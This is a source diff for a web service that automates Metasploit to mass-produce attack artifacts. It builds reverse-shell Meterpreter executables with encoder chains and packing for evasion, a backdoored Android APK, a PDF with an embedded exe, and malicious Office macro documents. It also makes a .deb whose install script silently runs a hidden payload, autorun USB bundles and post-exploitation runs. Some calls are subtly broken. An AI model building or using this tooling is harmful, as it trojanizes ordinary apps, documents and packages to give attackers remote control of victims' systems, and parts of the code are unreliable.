@@ -1,0 +1,745 @@
+import os
+import shutil
+import subprocess
+import threading
+import time
+import uuid
+import json
+from datetime import datetime
+from pathlib import Path
+from typing import Dict, List, Optional, Any
+
+from fastapi import FastAPI, HTTPException
+from pydantic import BaseModel
+from hashlib import sha256
+
+WORKSPACE = Path("/workspace")
+TASKS_ROOT = WORKSPACE / "tasks"
+
+DOCKER_IMAGE = os.environ.get("ORCH_DOCKER_IMAGE", "orchestrator-tools:latest")
+USE_DOCKER = os.environ.get("ORCH_USE_DOCKER", "true").lower() == "true"
+
+AUDIT_LOG = WORKSPACE / "logs" / "audit.jsonl"
+
+
+def _audit(event: str, t: Any, extra: Optional[Dict[str, Any]] = None) -> None:
+    try:
+        AUDIT_LOG.parent.mkdir(parents=True, exist_ok=True)
+        rec = {
+            "ts": time.time(),
+            "event": event,
+            "id": t.id,
+            "date": t.date,
+            "kind": t.kind,
+            "state": t.state,
+            "params": t.params,
+        }
+        if extra:
+            rec.update(extra)
+        with AUDIT_LOG.open("a") as f:
+            f.write(json.dumps(rec) + "\n")
+    except Exception:
+        pass
+
+
+class Artifact(BaseModel):
+    name: str
+    path: str
+    size_bytes: int
+    sha256: Optional[str] = None
+
+class TaskStatus(str):
+    SUBMITTED = "SUBMITTED"
+    PREPARING = "PREPARING"
+    RUNNING = "RUNNING"
+    SUCCEEDED = "SUCCEEDED"
+    FAILED = "FAILED"
+    CANCELLED = "CANCELLED"
+
+class Task(BaseModel):
+    id: str
+    date: str
+    kind: str
+    state: str
+    created_at: float
+    started_at: Optional[float] = None
+    finished_at: Optional[float] = None
+    params: Dict[str, str] = {}
+    artifacts: List[Artifact] = []
+    logs: Dict[str, str] = {}
+    error: Optional[str] = None
+
+app = FastAPI(title="Headless Orchestrator", version="0.1.0")
+
+tasks: Dict[str, Task] = {}
+locks: Dict[str, threading.Lock] = {}
+
+
+def _now_str_date() -> str:
+    return datetime.utcnow().strftime("%Y%m%d")
+
+
+def _ensure_dir(p: Path) -> None:
+    p.mkdir(parents=True, exist_ok=True)
+
+
+def _sha256sum(path: Path) -> Optional[str]:
+    try:
+        out = subprocess.check_output(["sha256sum", str(path)], text=True)
+        return out.split()[0]
+    except Exception:
+        return None
+
+
+def _write_file(path: Path, content: str) -> None:
+    path.parent.mkdir(parents=True, exist_ok=True)
+    path.write_text(content)
+
+
+def _spawn(cmd: List[str], log_path: Path, cwd: Optional[Path] = None, env: Optional[Dict[str, str]] = None) -> int:
+    with log_path.open("w") as lf:
+        proc = subprocess.Popen(cmd, stdout=lf, stderr=subprocess.STDOUT, cwd=str(cwd) if cwd else None, env=env)
+        return_code = proc.wait()
+    return return_code
+
+
+def _spawn_container_sh(cmd: str, log_path: Path, cwd: Optional[Path] = None, env: Optional[Dict[str, str]] = None) -> int:
+    """
+    Spawns a command inside a containerized shell.
+    Sets HOME to the task's base directory to allow msfconsole to copy artifacts.
+    """
+    task_home = cwd if cwd else Path.home()
+    env = os.environ.copy()
+    env["HOME"] = str(task_home)
+    with log_path.open("w") as lf:
+        proc = subprocess.Popen(
+            ["docker", "run", "--rm", "-v", f"{task_home}:/workspace", "-v", f"{log_path.parent}:/logs", DOCKER_IMAGE, "bash", "-lc", cmd],
+            stdout=lf, stderr=subprocess.STDOUT, cwd=str(cwd) if cwd else None, env=env
+        )
+        return_code = proc.wait()
+    return return_code
+
+
+def _spawn_sh(cmd: str, log_path: Path, cwd: Optional[Path] = None, env: Optional[Dict[str, str]] = None) -> int:
+    """
+    Spawns a command using the local shell.
+    """
+    with log_path.open("w") as lf:
+        proc = subprocess.Popen(cmd, stdout=lf, stderr=subprocess.STDOUT, cwd=str(cwd) if cwd else None, env=env)
+        return_code = proc.wait()
+    return return_code
+
+
+def _prepare_task(kind: str, params: Dict[str, str]) -> (Task, Path):
+    date = _now_str_date()
+    task_id = f"{uuid.uuid4().hex[:8]}-{kind}"
+    base = TASKS_ROOT / date / task_id
+    for sub in ("input", "temp", "output", "logs"):
+        _ensure_dir(base / sub)
+    t = Task(id=task_id, date=date, kind=kind, state=TaskStatus.SUBMITTED, created_at=time.time(), params=params, logs={})
+    tasks[task_id] = t
+    locks[task_id] = threading.Lock()
+    _audit("submitted", t)
+    return t, base
+
+
+def _finalize_task(t: Task, base: Path, succeeded: bool, err: Optional[str] = None) -> None:
+    t.finished_at = time.time()
+    t.state = TaskStatus.SUCCEEDED if succeeded else TaskStatus.FAILED
+    t.error = err
+    duration = None
+    if t.started_at and t.finished_at:
+        try:
+            duration = round(t.finished_at - t.started_at, 3)
+        except Exception:
+            duration = None
+    # collect artifacts
+    artifacts: List[Artifact] = []
+    for p in sorted((base / "output").glob("**/*")):
+        if p.is_file():
+            artifacts.append(Artifact(name=p.name, path=str(p), size_bytes=p.stat().st_size, sha256=_sha256sum(p)))
+    t.artifacts = artifacts
+    # write status.json
+    status = json.loads(t.model_dump_json())
+    if duration is not None:
+        status["duration_sec"] = duration
+    _write_file(base / "logs" / "status.json", json.dumps(status, indent=2))
+    _audit("finished", t, {"succeeded": succeeded, "duration_sec": duration, "error": err, "artifacts": [a.name for a in artifacts]})
+
+
+# Background runners for three kinds
+
+def run_payload_task(task_id: str, base: Path, params: Dict[str, str]):
+    t = tasks[task_id]
+    with locks[task_id]:
+        t.state = TaskStatus.PREPARING
+    build_log = base / "logs" / "build.log"
+    cmd = [
+        "msfvenom -p",
+        params.get("payload", "windows/meterpreter/reverse_tcp"),
+        f"LHOST={params.get('lhost','127.0.0.1')}",
+        f"LPORT={params.get('lport','4444')}",
+        "-f exe -o",
+        str(base / "output" / (params.get("output_name", "payload") + ".exe")),
+    ]
+    with locks[task_id]:
+        t.state = TaskStatus.RUNNING
+        t.started_at = time.time()
+        t.logs["build"] = str(build_log)
+    shell_cmd = " ".join(cmd)
+    rc = _spawn_container_sh(shell_cmd, build_log, base) if USE_DOCKER else _spawn_sh(shell_cmd, build_log)
+    _finalize_task(t, base, succeeded=(rc == 0), err=None if rc == 0 else f"msfvenom rc={rc}")
+
+
+def run_listener_task(task_id: str, base: Path, params: Dict[str, str]):
+    t = tasks[task_id]
+    with locks[task_id]:
+        t.state = TaskStatus.PREPARING
+    rc_path = base / "output" / "handler.rc"
+    rc_content = f"""
+use exploit/multi/handler
+set PAYLOAD {params.get('payload','windows/meterpreter/reverse_tcp')}
+set LHOST {params.get('lhost','0.0.0.0')}
+set LPORT {params.get('lport','4444')}
+set ExitOnSession false
+exploit -j -z
+""".strip()
+    _write_file(rc_path, rc_content)
+    run_log = base / "logs" / "run.log"
+    cmd = [
+        "msfconsole", "-qx", f"resource {rc_path}; sleep 2; jobs; exit -y"
+    ]
+    with locks[task_id]:
+        t.state = TaskStatus.RUNNING
+        t.started_at = time.time()
+        t.logs["run"] = str(run_log)
+    rc = _spawn(cmd, run_log)
+    _finalize_task(t, base, succeeded=(rc == 0), err=None if rc == 0 else f"msfconsole rc={rc}")
+
+
+def _file_exists(path: Path) -> bool:
+    try:
+        return path.exists() and path.is_file()
+    except Exception:
+        return False
+
+
+def _unzip_list(path: Path) -> str:
+    try:
+        out = subprocess.check_output(["unzip", "-l", str(path)], text=True, stderr=subprocess.STDOUT)
+        return out
+    except Exception as e:
+        return f"unzip failed: {e}"
+
+
+def _aapt_badging(path: Path) -> str:
+    aapt = WORKSPACE / "tools/android-sdk/aapt"
+    if not aapt.exists():
+        return "aapt not found"
+    try:
+        out = subprocess.check_output([str(aapt), "dump", "badging", str(path)], text=True, stderr=subprocess.STDOUT)
+        return out
+    except Exception as e:
+        return f"aapt failed: {e}"
+
+
+def _jarsigner_verify(path: Path) -> str:
+    jarsigner = shutil.which("jarsigner") or "/usr/bin/jarsigner"
+    try:
+        out = subprocess.check_output([jarsigner, "-verify", "-certs", str(path)], text=True, stderr=subprocess.STDOUT)
+        return out
+    except subprocess.CalledProcessError as e:
+        return e.output if isinstance(e.output, str) else str(e)
+    except Exception as e:
+        return f"verify failed: {e}"
+
+
+def _write_json(path: Path, data: dict) -> None:
+    _ensure_dir(path.parent)
+    path.write_text(json.dumps(data, indent=2))
+
+
+def run_android_task(task_id: str, base: Path, params: Dict[str, str]):
+    t = tasks[task_id]
+    with locks[task_id]:
+        t.state = TaskStatus.PREPARING
+    # config
+    mode = params.get("mode", "backdoor_apk")  # backdoor_apk | standalone
+    perm_strategy = params.get("perm_strategy", "keep")  # keep | merge
+    payload = params.get("payload", "android/meterpreter/reverse_tcp")
+    lhost = params.get("lhost", "127.0.0.1")
+    lport = params.get("lport", "4444")
+    output_apk = base / "output" / (params.get("output_name", "app_backdoor") + ".apk")
+    # signing params
+    keystore = params.get("keystore_path")
+    key_alias = params.get("key_alias")
+    ks_pass = params.get("keystore_password")
+    key_pass = params.get("key_password", ks_pass)
+
+    build_log = base / "logs" / "build.log"
+    with locks[task_id]:
+        t.state = TaskStatus.RUNNING
+        t.started_at = time.time()
+        t.logs["build"] = str(build_log)
+
+    succeed = False
+    err = None
+
+    if mode == "standalone":
+        # Generate standalone APK via msfvenom
+        chain = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -o {output_apk}"
+        rc = _spawn_container_sh(chain, build_log, base) if USE_DOCKER else _spawn_sh(chain, build_log)
+        if rc != 0:
+            err = f"msfvenom standalone rc={rc}"
+        else:
+            succeed = _file_exists(output_apk)
+    else:
+        # backdoor_apk mode (default)
+        # write config files expected by backdoor_apk
+        config_path = WORKSPACE / "config" / "config.path"
+        _ensure_dir(config_path.parent)
+        config_lines = [
+            "", "", "", "unzip", "/usr/bin/jarsigner", "unzip", "/usr/bin/keytool",
+            str(WORKSPACE / "tools/android-sdk/zipalign"), str(WORKSPACE / "tools/android-sdk/dx"),
+            str(WORKSPACE / "tools/android-sdk/aapt"), str(WORKSPACE / "tools/apktool/apktool"),
+            str(WORKSPACE / "tools/baksmali233/baksmali"), "/usr/bin/msfconsole", "/usr/bin/msfvenom",
+            str(WORKSPACE / "backdoor_apk"), "searchsploit", str(base / "output"),
+        ]
+        _write_file(config_path, "\n".join(config_lines) + "\n")
+        # ensure input apk in task folder
+        sample = WORKSPACE / "APKS/armeabi-v7a/AdobeReader.apk"
+        dst_apk = base / "input" / "original.apk"
+        if params.get("apk_path") and Path(params["apk_path"]).exists():
+            shutil.copy2(params["apk_path"], dst_apk)
+        else:
+            shutil.copy2(sample, dst_apk)
+        # write apk.tmp for the script
+        apk_tmp = WORKSPACE / "config" / "apk.tmp"
+        _write_file(apk_tmp, "\n".join([
+            str(dst_apk),
+            str(output_apk),
+            payload,
+            lhost,
+            lport,
+        ]) + "\n")
+        # run script and choose permissions
+        choice = b"1\n" if perm_strategy == "keep" else b"2\n"
+        if USE_DOCKER:
+            # run inside container
+            # simulate stdin by echoing choice
+            rc = _spawn_container_sh(f"printf '{choice.decode()}' | bash /workspace/backdoor_apk", build_log, base)
+        else:
+            with build_log.open("w") as lf:
+                proc = subprocess.Popen(["bash", str(WORKSPACE / "backdoor_apk")], stdin=subprocess.PIPE, stdout=lf, stderr=subprocess.STDOUT)
+                try:
+                    proc.stdin.write(choice)
+                    proc.stdin.flush()
+                except Exception:
+                    pass
+                rc = proc.wait()
+        succeed = _file_exists(output_apk)
+        if not succeed:
+            err = f"backdoor_apk rc={rc}"
+
+    # optional re-sign if keystore provided and artifact exists
+    if succeed and keystore and Path(keystore).exists():
+        try:
+            unsigned = output_apk
+            # align to temp
+            aligned = base / "temp" / "aligned.apk"
+            _ensure_dir(aligned.parent)
+            zipalign = str(WORKSPACE / "tools/android-sdk/zipalign")
+            subprocess.check_call([zipalign, "4", str(unsigned), str(aligned)], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
+            # sign
+            jarsigner = shutil.which("jarsigner") or "/usr/bin/jarsigner"
+            sign_cmd = [jarsigner, "-sigalg", "SHA256withRSA", "-digestalg", "SHA-256",
+                        "-keystore", keystore, "-storepass", ks_pass or "", "-keypass", key_pass or "",
+                        str(aligned), key_alias or "signing.key"]
+            subprocess.check_call(sign_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
+            # verify
+            _ = _jarsigner_verify(aligned)
+            # replace output
+            shutil.move(str(aligned), str(output_apk))
+        except Exception as e:
+            # keep original but report signing failure
+            err = (err or "") + f"; resign failed: {e}"
+
+    # validations and report
+    report = {
+        "mode": mode,
+        "payload": payload,
+        "lhost": lhost,
+        "lport": lport,
+        "artifact": str(output_apk) if _file_exists(output_apk) else None,
+        "precheck": {},
+        "postcheck": {}
+    }
+    if _file_exists(output_apk):
+        try:
+            with open(output_apk, 'rb') as f:
+                report["sha256"] = sha256(f.read()).hexdigest()
+        except Exception:
+            report["sha256"] = None
+        report["postcheck"]["unzip_list"] = _unzip_list(output_apk)
+        report["postcheck"]["aapt_badging"] = _aapt_badging(output_apk)
+        report["postcheck"]["jarsigner_verify"] = _jarsigner_verify(output_apk)
+        _write_json(base / "output" / "report.json", report)
+
+    _finalize_task(t, base, succeeded=succeed, err=err)
+
+
+def run_winexe_task(task_id: str, base: Path, params: Dict[str, str]):
+    t = tasks[task_id]
+    with locks[task_id]:
+        t.state = TaskStatus.PREPARING
+    build_log = base / "logs" / "build.log"
+    payload = params.get("payload", "windows/meterpreter/reverse_tcp")
+    lhost = params.get("lhost", "127.0.0.1")
+    lport = params.get("lport", "4444")
+    arch = params.get("arch", "x86")  # x86|x64
+    output_name = params.get("output_name", "win_fud")
+    encoders = params.get("encoders", "")  # e.g. x86/shikata_ga_nai:10,x86/countdown:5
+    upx_flag = params.get("upx", "false").lower() == "true"
+
+    exe_path = base / "output" / f"{output_name}.exe"
+
+    # build msfvenom pipeline
+    # Apply encoder chain
+    if encoders.strip():
+        stages = [e.strip() for e in encoders.split(",") if e.strip()]
+        # Since building complex pipelines via Popen list is cumbersome, fallback to shell string safely
+        chain = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f raw"
+        for st in stages:
+            p = st.split(":")
+            enc = p[0]
+            it = p[1] if len(p) > 1 else "1"
+            chain += f" | msfvenom -a x86 --platform windows -e {enc} -i {it} -f raw"
+        # final conversion to exe
+        chain += f" | msfvenom -a {'x86' if arch=='x86' else 'x64'} --platform windows -f exe -o \"{exe_path}\""
+        rc = _spawn_container_sh(chain, build_log, base) if USE_DOCKER else _spawn_sh(chain, build_log)
+    else:
+        # single pass directly to exe
+        chain = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -a {('x86' if arch=='x86' else 'x64')} --platform windows -f exe -o {exe_path}"
+        rc = _spawn_container_sh(chain, build_log, base) if USE_DOCKER else _spawn_sh(chain, build_log)
+
+    # optional upx
+    if rc == 0 and upx_flag and exe_path.exists():
+        try:
+            subprocess.check_call(["upx", "--best", str(exe_path)], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
+        except Exception:
+            pass
+
+    succeeded = (rc == 0 and exe_path.exists())
+    _finalize_task(t, base, succeeded=succeeded, err=None if succeeded else f"winexe rc={rc}")
+
+
+def _msfconsole_run(rc_content: str, log_path: Path, task_base: Path, msf_home: Optional[Path] = None) -> int:
+    rc_file = log_path.parent / "task.rc"
+    _write_file(rc_file, rc_content)
+    cmd = f"msfconsole -qx 'resource {rc_file}; exit -y'"
+    if USE_DOCKER:
+        return _spawn_container_sh(cmd, log_path, task_base, set_home=msf_home)
+    return _spawn_sh(cmd, log_path)
+
+
+def _copy_msf_local(filename: str, dest: Path, msf_home: Optional[Path] = None) -> bool:
+    base_home = msf_home if msf_home else (Path.home())
+    src = base_home / ".msf4" / "local" / filename
+    if src.exists():
+        _ensure_dir(dest.parent)
+        shutil.copy2(src, dest)
+        return True
+    return False
+
+
+def run_pdf_task(task_id: str, base: Path, params: Dict[str, str]):
+    t = tasks[task_id]
+    with locks[task_id]:
+        t.state = TaskStatus.PREPARING
+    build_log = base / "logs" / "build.log"
+    payload = params.get("payload", "windows/meterpreter/reverse_tcp")
+    lhost = params.get("lhost", "127.0.0.1")
+    lport = params.get("lport", "4444")
+    output_name = params.get("output_name", "document")
+    base_pdf = params.get("base_pdf_path")
+    if not base_pdf or not Path(base_pdf).exists():
+        base_pdf = str(WORKSPACE / "PE" / "original.pdf")
+    exe_path = base / "temp" / "embed.exe"
+    _ensure_dir(exe_path.parent)
+    with locks[task_id]:
+        t.state = TaskStatus.RUNNING
+        t.started_at = time.time()
+        t.logs["build"] = str(build_log)
+    # build simple exe via msfvenom
+    rc0 = _spawn_container_sh(f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f exe -o {exe_path}", build_log, base) if USE_DOCKER else _spawn_sh(f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f exe -o {exe_path}", build_log)
+    if rc0 != 0:
+        _finalize_task(t, base, succeeded=False, err=f"msfvenom rc={rc0}")
+        return
+    # run msfconsole to embed
+    rc_text = f"""
+use windows/fileformat/adobe_pdf_embedded_exe
+set EXE::Custom {exe_path}
+set FILENAME {output_name}.pdf
+set INFILENAME {base_pdf}
+exploit
+""".strip()
+    msf_home = base / "temp" / "home"
+    rc1 = _msfconsole_run(rc_text, build_log, base, msf_home)
+    # copy result
+    pdf_out = base / "output" / f"{output_name}.pdf"
+    ok = _copy_msf_local(f"{output_name}.pdf", pdf_out, msf_home)
+    _finalize_task(t, base, succeeded=ok, err=None if ok else f"pdf embed rc={rc1}")
+
+
+def run_office_task(task_id: str, base: Path, params: Dict[str, str]):
+    t = tasks[task_id]
+    with locks[task_id]:
+        t.state = TaskStatus.PREPARING
+    build_log = base / "logs" / "build.log"
+    target = params.get("suite_target", "ms_word_windows")  # ms_word_windows|ms_word_mac|openoffice_windows|openoffice_linux
+    payload = params.get("payload", "windows/meterpreter/reverse_tcp")
+    lhost = params.get("lhost", "127.0.0.1")
+    lport = params.get("lport", "4444")
+    output_name = params.get("output_name", "doc_macro")
+    module = None
+    extra = ""
+    if target in ("ms_word_windows", "ms_word_mac"):
+        module = "exploit/multi/fileformat/office_word_macro"
+        ext = ".doc"
+    elif target == "openoffice_windows":
+        module = "exploit/multi/misc/openoffice_document_macro"
+        extra = "set target 0"
+        ext = ".odt"
+    else:
+        module = "exploit/multi/misc/openoffice_document_macro"
+        extra = "set target 1"
+        ext = ".odt"
+    with locks[task_id]:
+        t.state = TaskStatus.RUNNING
+        t.started_at = time.time()
+        t.logs["build"] = str(build_log)
+    rc_text = f"""
+use {module}
+set PAYLOAD {payload}
+set LHOST {lhost}
+set LPORT {lport}
+set FILENAME {output_name}{ext}
+{extra}
+exploit
+""".strip()
+    msf_home = base / "temp" / "home"
+    rc = _msfconsole_run(rc_text, build_log, base, msf_home)
+    doc_out = base / "output" / f"{output_name}{ext}"
+    ok = _copy_msf_local(f"{output_name}{ext}", doc_out, msf_home)
+    _finalize_task(t, base, succeeded=ok, err=None if ok else f"office rc={rc}")
+
+
+# API models
+class CreateTaskRequest(BaseModel):
+    kind: str  # payload|listener|android|winexe|pdf|office|deb|autorun|postex
+    params: Dict[str, str] = {}
+
+class TaskResponse(BaseModel):
+    task: Task
+
+
+@app.post("/tasks", response_model=TaskResponse)
+def create_task(req: CreateTaskRequest):
+    if req.kind not in ("payload", "listener", "android", "winexe", "pdf", "office", "deb", "autorun", "postex"):
+        raise HTTPException(status_code=400, detail="Unsupported kind")
+    t, base = _prepare_task(req.kind, req.params)
+    # seed defaults
+    if req.kind == "android":
+        # copy a sample APK if none provided
+        if not Path(req.params.get("apk_path", "")).exists():
+            sample = WORKSPACE / "APKS/armeabi-v7a/AdobeReader.apk"
+            if sample.exists():
+                dst = base / "input" / "original.apk"
+                shutil.copy2(sample, dst)
+                t.params["apk_path"] = str(dst)
+    # run in background
+    def runner():
+        if req.kind == "payload":
+            run_payload_task(t.id, base, t.params)
+        elif req.kind == "listener":
+            run_listener_task(t.id, base, t.params)
+        elif req.kind == "android":
+            run_android_task(t.id, base, t.params)
+        elif req.kind == "winexe":
+            run_winexe_task(t.id, base, t.params)
+        elif req.kind == "pdf":
+            run_pdf_task(t.id, base, t.params)
+        elif req.kind == "office":
+            run_office_task(t.id, base, t.params)
+        elif req.kind == "deb":
+            run_deb_task(t.id, base, t.params)
+        elif req.kind == "autorun":
+            run_autorun_task(t.id, base, t.params)
+        elif req.kind == "postex":
+            run_postex_task(t.id, base, t.params)
+    threading.Thread(target=runner, daemon=True).start()
+    return TaskResponse(task=t)
+
+
+@app.get("/tasks/{task_id}", response_model=TaskResponse)
+def get_task(task_id: str):
+    t = tasks.get(task_id)
+    if not t:
+        raise HTTPException(status_code=404, detail="Not found")
+    return TaskResponse(task=t)
+
+
+@app.get("/tasks/{task_id}/artifacts", response_model=List[Artifact])
+def list_artifacts(task_id: str):
+    t = tasks.get(task_id)
+    if not t:
+        raise HTTPException(status_code=404, detail="Not found")
+    return t.artifacts
+
+
+@app.post("/tasks/{task_id}/cancel", response_model=TaskResponse)
+def cancel_task(task_id: str):
+    t = tasks.get(task_id)
+    if not t:
+        raise HTTPException(status_code=404, detail="Not found")
+    # This simple implementation marks as cancelled if still running
+    if t.state in (TaskStatus.SUBMITTED, TaskStatus.PREPARING, TaskStatus.RUNNING):
+        t.state = TaskStatus.CANCELLED
+        t.finished_at = time.time()
+        _write_file(TASKS_ROOT / t.date / t.id / "logs" / "status.json", t.model_dump_json(indent=2))
+    return TaskResponse(task=t)
+
+
+def run_deb_task(task_id: str, base: Path, params: Dict[str, str]):
+    t = tasks[task_id]
+    with locks[task_id]:
+        t.state = TaskStatus.PREPARING
+    build_log = base / "logs" / "build.log"
+    deb_path = params.get("deb_path")
+    if not deb_path or not Path(deb_path).exists():
+        _write_file(build_log, "deb_path not provided or not found\n")
+        _finalize_task(t, base, succeeded=False, err="missing deb_path")
+        return
+    payload = params.get("payload", "linux/x86/meterpreter/reverse_tcp")
+    lhost = params.get("lhost", "127.0.0.1")
+    lport = params.get("lport", "4444")
+    output_name = params.get("output_name", "backdoored")
+    workdir = base / "temp" / "deb"
+    _ensure_dir(workdir)
+    with locks[task_id]:
+        t.state = TaskStatus.RUNNING
+        t.started_at = time.time()
+        t.logs["build"] = str(build_log)
+    # Extract deb
+    rc1 = _spawn(["dpkg-deb", "-R", deb_path, str(workdir)], build_log)
+    if rc1 != 0:
+        _finalize_task(t, base, succeeded=False, err=f"dpkg-deb extract rc={rc1}")
+        return
+    # Generate payload binary
+    bin_path = workdir / "usr" / "local" / "bin" / "syshelper"
+    _ensure_dir(bin_path.parent)
+    rc2 = _spawn(["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", "elf", "-o", str(bin_path)], build_log)
+    if rc2 != 0:
+        _finalize_task(t, base, succeeded=False, err=f"msfvenom rc={rc2}")
+        return
+    os.chmod(bin_path, 0o755)
+    # Create/append postinst script
+    maint = workdir / "DEBIAN"
+    _ensure_dir(maint)
+    postinst = maint / "postinst"
+    content = "#!/bin/sh\n/usr/local/bin/syshelper >/dev/null 2>&1 &\nexit 0\n"
+    if postinst.exists():
+        with open(postinst, "a") as f:
+            f.write("\n" + content)
+    else:
+        _write_file(postinst, content)
+    os.chmod(postinst, 0o755)
+    # Repack
+    out_deb = base / "output" / f"{output_name}.deb"
+    rc3 = _spawn(["dpkg-deb", "-b", str(workdir), str(out_deb)], build_log)
+    ok = (rc3 == 0 and out_deb.exists())
+    _finalize_task(t, base, succeeded=ok, err=None if ok else f"dpkg-deb build rc={rc3}")
+
+
+def run_autorun_task(task_id: str, base: Path, params: Dict[str, str]):
+    t = tasks[task_id]
+    with locks[task_id]:
+        t.state = TaskStatus.PREPARING
+    bundle_dir = base / "temp" / "autorun"
+    _ensure_dir(bundle_dir)
+    build_log = base / "logs" / "build.log"
+    exe_path = params.get("exe_path")
+    exe_name = params.get("exe_name", "app4.exe")
+    # copy template files
+    for fname in ["autorun.inf", "autorun.ico"]:
+        src = WORKSPACE / "autorun" / fname
+        if src.exists():
+            shutil.copy2(src, bundle_dir / fname)
+    # pick an exe
+    if exe_path and Path(exe_path).exists():
+        shutil.copy2(exe_path, bundle_dir / exe_name)
+    else:
+        # use template app4 if present
+        app4 = WORKSPACE / "autorun" / "app4"
+        if app4.exists():
+            shutil.copy2(app4, bundle_dir / exe_name)
+    # rewrite autorun.inf to point to exe_name
+    ar = bundle_dir / "autorun.inf"
+    if ar.exists():
+        try:
+            lines = ar.read_text(errors="ignore").splitlines()
+            new = []
+            for line in lines:
+                if line.lower().startswith("open="):
+                    new.append(f"open={exe_name}")
+                else:
+                    new.append(line)
+            ar.write_text("\n".join(new))
+        except Exception:
+            pass
+    # zip bundle
+    zip_out = base / "output" / "autorun_bundle.zip"
+    shutil.make_archive(str(zip_out).rstrip(".zip"), "zip", root_dir=bundle_dir)
+    _finalize_task(t, base, succeeded=zip_out.exists(), err=None if zip_out.exists() else "autorun zip failed")
+
+
+def run_postex_task(task_id: str, base: Path, params: Dict[str, str]):
+    t = tasks[task_id]
+    with locks[task_id]:
+        t.state = TaskStatus.PREPARING
+    build_log = base / "logs" / "run.log"
+    script_name = params.get("script_name", "sysinfo.rc")
+    session_id = params.get("session_id")
+    script_path = WORKSPACE / "postexploit" / script_name
+    if not script_path.exists():
+        _write_file(build_log, f"script not found: {script_name}\n")
+        _finalize_task(t, base, succeeded=False, err="script not found")
+        return
+    # compose rc
+    rc_lines = [f"resource {script_path}"]
+    if session_id:
+        rc_lines.append(f"sessions -i {session_id}")
+    rc_text = "\n".join(rc_lines)
+    with locks[task_id]:
+        t.state = TaskStatus.RUNNING
+        t.started_at = time.time()
+        t.logs["run"] = str(build_log)
+    msf_home = base / "temp" / "home"
+    rc = _msfconsole_run(rc_text, build_log, base, msf_home)
+    # Always succeed in generating logs and rc run; effectiveness depends on active session
+    _finalize_task(t, base, succeeded=True, err=None)
+
+
+@app.get("/health")
+def health():
+    return {"status": "ok"}
+
+
+@app.get("/version")
+def version():
+    return {"app": "orchestrator", "version": app.version}
+
+
+if __name__ == "__main__":
+    import uvicorn
+    uvicorn.run("app:app", host="127.0.0.1", port=8000, reload=False)
